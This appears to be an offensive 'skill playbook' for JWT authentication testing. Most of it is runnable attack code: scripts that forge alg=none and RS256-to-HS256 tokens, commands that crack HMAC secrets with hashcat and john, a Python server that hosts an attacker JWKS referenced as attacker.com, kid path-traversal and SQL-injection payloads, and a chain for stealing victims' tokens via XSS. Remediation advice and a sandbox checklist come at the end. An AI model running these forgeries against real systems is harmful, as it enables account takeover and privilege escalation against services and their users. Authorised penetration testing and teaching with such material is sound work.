# JSON Web Token (JWT) Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts)
**OWASP Mapping:** A02:2021 – Cryptographic Failures, A01:2021 – Broken Access Control, A07:2021 – Identification and Authentication Failures
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: jwt-testing-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A02:2021-Cryptographic Failures
  - A01:2021-Broken Access Control
  - A07:2021-Identification and Authentication Failures
tags:
  - jwt
  - json-web-token
  - token-manipulation
  - authentication-bypass
  - session-hijacking
  - T1190
  - T1078
environments:
  - api
  - web
  - microservice
  - oauth
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identify Token Type and Transport

JWT is three URL-safe Base64 segments joined by dots: `header.payload.signature`.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Where to look: `Authorization: Bearer`, `Cookie`, `x-access-token`/`x-api-token` headers, POST body fields (`token`, `access_token`), query params.

Decode locally: `echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null`

### 1.2 Header/Claim Analysis

| Header/Claim | Meaning | Security Relevance |
|---|---|---|
| `alg` | HS256, RS256, none | alg=none, algorithm confusion |
| `kid` | Key ID | Path traversal, SQLi, injection |
| `jku` / `jwks` | JWKS URL | JWKS injection, SSRF |
| `x5u` | X.509 URL | Key injection |
| `sub` | Subject (user id) | Account impersonation |
| `exp` / `nbf` / `iat` | Time claims | Expiry bypass |
| `jti` | Token ID | Replay detection |
| `scope` / `role` | Permissions | Privilege escalation |

### 1.3 Automated Detection

```bash
nuclei -u https://target.com/api -t ~/nuclei-templates/vulnerabilities/generic/jwt/ -jsonl jwt.jsonl
jwt_tool <token> -T   # inspect timing claims
```

---

## 2. Confirmation

### 2.1 Tampering Test Matrix

Run jwt_tool scanning mode against the endpoint:
```bash
jwt_tool -t https://target.com/api/me -rh "Authorization: Bearer <token>" -M at -cv "HTTP Status:"
```

| Attack | Test | Success indicator |
|---|---|---|
| alg=none | Replace alg with none, drop signature | 200 as admin |
| RS256->HS256 | Sign with public key as HMAC secret | 200 |
| Weak secret | Crack HMAC secret offline | Signature verified |
| kid injection | `kid: ../../dev/null` + HS256 | Accepted |
| Claim swap | Modify `sub`/`role` without re-signing | 200 if no validation |
| exp/nbf bypass | Set exp far future | Accepted after expiry |

### 2.2 Verify Signature Validation Exists

`curl -s https://target.com/api/me -H "Authorization: Bearer $(echo "<header>.<payload>.")"` -> 200 = signature not validated, 401 = validation present.

Compare responses for: valid token (baseline 200), tampered payload with original signature (401 if checked), no-signature token (401 if required).

---

## 3. Exploitation

### 3.1 alg=none

```bash
HEADER=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | sed 's/=//g')
PAYLOAD=$(printf '{"sub":"admin","role":"admin","exp":4102444800}' | base64 -w0 | sed 's/=//g')
TOKEN="$HEADER.$PAYLOAD."
curl -s https://target.com/api/admin -H "Authorization: Bearer $TOKEN"
```

Try case variants `None`, `NONE`, `nOnE` to bypass filters.

### 3.2 RS256 to HS256 Confusion

If the server accepts HS256 while publishing an RS256 public key, sign with the public key as the HMAC secret. The key is usually at `/.well-known/jwks.json` or `/.well-known/openid-configuration`:

```bash
python3 -c "
import jwt, time
pub = open('public.pem','rb').read()
print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600}, pub, algorithm='HS256'))"
```

### 3.3 Weak HMAC Secret Cracking

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
john jwt.txt --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

Re-sign a forged token once cracked: `jwt_tool <token> -S hs256 -k SECRET -p '{"sub":"admin","role":"admin","exp":4102444800}'`

### 3.4 JWKS Injection (jku/jwks)

Host an attacker JWKS and point `jku` at it:
```bash
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(json.dumps({'keys':[{'kty':'RSA','use':'sig','alg':'RS256',
          'kid':'attacker','n':'<modulus>','e':'AQAB'}]}).encode())
HTTPServer(('0.0.0.0',80),H).serve_forever()"
```
```bash
jwt_tool <token> -X k -ju "http://attacker.com/jwks.json"
```

Also SSRF vector: if the server fetches the `jku` URL it trusts attacker keys.
### 3.5 kid Header Injection

If `kid` is concatenated into a file path, use path traversal with an empty key:

```bash
HEADER=$(printf '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}' | base64 -w0 | sed 's/=//g')
PAYLOAD=$(printf '{"sub":"admin","exp":4102444800}' | base64 -w0 | sed 's/=//g')
SIG=$(printf '%s.%s' "$HEADER" "$PAYLOAD" | openssl dgst -sha256 -mac HMAC -macopt hexkey:0000000000000000000000000000000000000000000000000000000000000000 | awk '{print $2}' | xxd -r -p | base64 -w0 | sed 's/=//g' | tr '+/' '-_')
echo "$HEADER.$PAYLOAD.$SIG"
```

Also test SQLi: `"kid":"' UNION SELECT 'key'--"` and command injection if `kid` reaches a shell.

### 3.6 Claim Manipulation and Expiry Bypass

Forge tokens with permissive claims: `{"sub":"admin","role":"admin","isAdmin":true,"exp":4102444800,"nbf":0,"iat":0}`

Expiry test cases: `exp` removed; far future (`4102444800`); negative/zero; `nbf` future; `exp` as string `"0"` (type confusion); duplicate claims `{"sub":"victim","sub":"admin"}`.

### 3.7 Session Hijack Chaining

1. Steal victim JWT via XSS, open redirect, referer leakage, or log poisoning
2. Decode; check `exp`, `jti`, `aud`, `iss`; try `nbf`/`exp` bypass to extend validity
3. Replay against API to confirm access
4. Tamper `role`/`scope` if signature is weak

---

## 4. Tool-Specific Guidance

### 4.1 jwt_tool

```bash
jwt_tool <token>                                    # decode
jwt_tool -t URL -rh "Authorization: Bearer <t>" -M at   # scan
jwt_tool <token> -X a                              # alg=none
jwt_tool <token> -X k                              # JWKS injection
jwt_tool <token> -X i -I -hc kid -hv ../../dev/null  # kid traversal
jwt_tool <token> -X s -pc role -pv admin           # swap claims
jwt_tool <token> -S hs256 -k SECRET                # re-sign
jwt_tool <token> -S rs256 -k private.pem
```

### 4.2 hashcat / Burp

`hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show`

Burp extensions: **JWT Editor** (tamper/sign in Repeater), **JSON Web Tokens** (decode in context menu). Workflow: Proxy JWT -> JWT Editor -> modify `alg`/`sub`/`exp` -> Replay.

### 4.3 PyJWT

`python3 -c "import jwt, time; print(jwt.encode({'sub':'admin','exp':int(time.time())+3600}, secret, algorithm='HS256'))"`

---

## 5. PoC Generation

### PoC Template

```markdown
## JWT Authentication Bypass — [FINDING_ID]

**Endpoint:** https://target.com/api/admin
**Header:** Authorization: Bearer <token>
**Vulnerability:** [alg=none / RS256->HS256 / weak secret / JWKS injection / kid injection / exp bypass]

### Payload
<forged token>

### Evidence
- 401 on original token, 200 on forged token
- Cracked secret: [secret]
- Forged sub/role: [admin]

### Impact
- Account takeover: YES (impersonate any sub)
- Privilege escalation: YES (role -> admin)
- Session persistence beyond exp: YES

### Remediation
- Reject alg=none; enforce algorithm allow-list
- Separate signing and verification keys
- Validate kid, jku, x5u against an allow-list
- Use long random HS256 secrets or RS256/ES256
- Validate all claims (exp, nbf, iat, iss, aud)
- Rotate keys; denylist stolen jti
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Forged tokens validated against sandbox API only
- [ ] No production tokens cracked or replayed
- [ ] Weak-secret cracking limited to test material
- [ ] Impact scoped: read vs write vs admin per endpoint
- [ ] Token-theft chain confirmed in isolated lab

### Prohibited Actions
- Replaying stolen tokens against production
- Cracking production session secrets
- Issuing forged admin tokens on live systems

---

## 7. Cheat Sheet / Reference

| Attack | Algorithm | Precondition | Payload hint |
|---|---|---|---|
| alg=none | none | Server trusts alg | `{"alg":"none"}` no sig |
| RS256->HS256 | HS256 | Public key exposed | Sign with public key |
| Weak secret | HS256 | Short/guessable | hashcat -m 16500 |
| JWKS injection | RS256 | Trusts jku | Serve attacker JWKS |
| kid traversal | HS256 | kid in file path | `kid: ../../dev/null` |
| kid SQLi | HS256 | kid in SQL | `' UNION SELECT 'x'--` |
| exp bypass | any | exp unenforced | exp 4102444800 |
| Duplicate sub | any | Parser confusion | `{"sub":"v","sub":"a"}` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Auth bypass initial access |
| T1078 | Valid Accounts | Forged token abuse |
| T1550.001 | Use Alternate Authentication Material: App Access Token | Token replay |
| T1538 | Steal Web Session Cookie | Token theft chaining |
| T1528 | Steal Application Access Token | OAuth token theft |
| T1136 | Create Account | Via admin impersonation |

---

## 9. References

- PayloadsAllTheThings JWT: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
- HackTricks JWT: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- jwt_tool: https://github.com/ticarpi/jwt_tool
- PortSwigger JWT: https://portswigger.net/web-security/jwt

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
